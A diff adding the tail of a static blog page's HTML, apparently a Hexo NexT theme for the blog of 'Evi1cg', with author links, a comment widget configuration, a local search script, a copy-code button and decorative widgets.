+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
